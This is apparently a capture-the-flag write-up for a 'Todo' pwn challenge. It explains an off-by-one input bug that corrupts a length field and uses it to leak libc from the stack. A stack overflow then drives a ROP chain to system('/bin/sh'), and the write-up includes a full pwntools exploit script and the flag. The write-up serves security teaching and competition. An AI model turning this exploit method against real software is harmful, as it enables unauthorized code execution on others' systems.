# Todo
Author: `Carixo`

## Introduction
This challenge ships a stack-based todo manager that stores up to 32 notes inside a single `TodoList` structure that lives on `main`'s stack.

Remember to patch the binary to use the correct libc when debugging locally. This can be done using [pwninit](github.com/io12/pwninit)

## Binary Protections
- `Full RELRO`, `NX`, and `PIE` are enabled
- There is **no** `stack canary`

## Off-by-One Length Corruption

All user input funnels through `getInput`, which intends to stop reading after `size` bytes:

```c
void getInput(String *s, ssize_t size) {
    if (!s) return;
    for (int i = 0; i <= size; i++) {
        s->length = i;
        ssize_t n = read(STDIN_FILENO, s->str + i, 1);
        if (n <= 0 || s->str[i] == '\n') return;
    }
}
```

The important detail is that the loop condition is `i <= size`, so we write one byte past the `String.str` array (`MAX_STRING_LENGTH == 128`) and into the `length`.  

When we add a todo with 128 bytes followed by `0xff`, the struct stored in `TodoList.todos[idx]` now has:
- `str`: 128 bytes we control
- `length`: `0x00000000000000ff`

## Leaking Libc

`TodoList list` is allocated on `main`'s stack. Printing a todo uses `write(1, s->str, s->length)`, so the corrupted length lets us read 255 bytes starting from our string. For the last todo (index 31) this read walks:
1. Our string buffer (128 bytes)
2. The struct's `length` and the `TodoList.count` field
3. The `choice` variable in the `main` function
4. `main`'s saved frame pointer and, crucially, the saved return address (`__libc_start_call_main+122`)

By filling the list and then printing the final entry, we recover the return address, subtract the known offset, and obtain the libc base.

## From Edit to ROP

`editTodoItem` creates a new `String` with the same length as the original `String` in `list->todos[idx]`. `getInput` is then called on `edited`.

```c
String edited = {0};
edited.length = list->todos[idx].length;  // user-controlled 0xff
getInput(&edited, edited.length);         // overflows the stack frame
list->todos[idx] = edited;
```

With the length set to 0xff, `getInput` writes well beyond `edited.str`, overflowing the stack all the way to the stored return address. We craft the payload so that:
- Bytes `0x88–0x8f` (offset 136) rewrite the `idx` variable to a valid index (e.g. `20`), ensuring the concluding `list->todos[idx] = edited;` still works and doesn't segfault.
- Bytes `0xa8+` (offset 168) hold the ROP chain calling `system("/bin/sh")`.

When the function returns, execution pivots into `system("/bin/sh")`, giving us an interactive shell.

## Exploit Walkthrough

1. Spawn the process/remote and add 32 todos containing `b"A"*128 + b"\xff"`, corrupting every stored length to `0xff`.
2. Print the last entry; parse the 255-byte leak and recover the pointer to `__libc_start_call_main+122`, yielding the libc base.
3. Build a ROP chain (`ret; system("/bin/sh")`) using the given libc.
4. Use the edit menu and send the overflow payload:
   - Padding up to offset 136
   - `p64(idx)` to have a working index when copying the `String`
   - Padding up to offset 168, followed by the ROP chain
5. Drop into an interactive shell and read the flag.

## Solve Script

```py
from pwn import *

con = "10.212.173.64 32209"

host, port = con.replace(" ", ":").split(":")

ssl = False

binary = './todo_patched'

gdbscript = '''
    b *editTodoItem
    c
'''

elf  = context.binary = ELF(binary)
libc = context.binary.libc
context.terminal = ['tmux', 'splitw', '-h']



# utils
u64 = lambda d: struct.unpack("<Q", d.ljust(8, b"\0"))[0]
u32 = lambda d: struct.unpack("<I", d.ljust(4, b"\0"))[0]
u16 = lambda d: struct.unpack("<H", d.ljust(2, b"\0"))[0]

# credits to spwn by @chino
ru         = lambda *x, **y: p.recvuntil(*x, **y, drop=True)
rl         = lambda *x, **y: p.recvline(*x, **y, keepends=False)
rc         = lambda *x, **y: p.recv(*x, **y)
sla        = lambda *x, **y: p.sendlineafter(*x, **y)
sa         = lambda *x, **y: p.sendafter(*x, **y)
sl         = lambda *x, **y: p.sendline(*x, **y)
sn         = lambda *x, **y: p.send(*x, **y)
logbase    = lambda: log.info("libc base = %#x" % libc.address)
logleak    = lambda name, val: log.info(name+" = %#x" % val)
ls         = lambda x: log.success(x)
lss        = lambda x: ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))
one_gadget = lambda: [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

# exit_handler stuff
fs_decrypt = lambda addr, key: ror(addr, 0x11) ^ key
fs_encrypt = lambda addr, key: rol(addr ^ key, 0x11)


# heap stuff
prot_ptr = lambda pos, ptr: (pos >> 12) ^ ptr
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def start(argv=[], *a, **kw):
    if args.GDB: return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: return remote(host, port, ssl=ssl)
    else: return process([elf.path] + argv, *a, **kw)


def addTodo(todo):
    sla(b"choice: ", b"0")
    sa(b": ", todo)

def printTodoItem(index):
    sla(b"choice: ", b"1")
    sla(b": ", str(index).encode())
    ru(b": ")
    return rl()

def editTodoItem(todo, index):
    sla(b"choice: ", b"3")
    sla(b": ", str(index).encode())
    sla(b": ", todo)

p = start()
for i in range(32):
    addTodo(b"A"*128 + b"\xff")
todo = printTodoItem(31)
leak = [u64(todo[i:i+8]) for i in range(0, len(todo), 8)]
libc.address = leak[20] - (libc.sym.__libc_start_call_main+122)
logbase()

rop = ROP(libc)
rop.raw("A"*128) # fill buffer
rop.raw("B"*8) # length
# we are overflowing index as well, so we must make sure it is a "valid" index so that the copy can happen without issues
rop.raw(20)
rop.raw("A"*24) # extra padding
# ret to align stack so it's multiple of 16 (16 byte alignment)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\x00")))

editTodoItem(rop.chain(), 0)

p.interactive()
```

## Flag

`flag{ad7c9b9ad75b4a6ef992f252c882568f}`
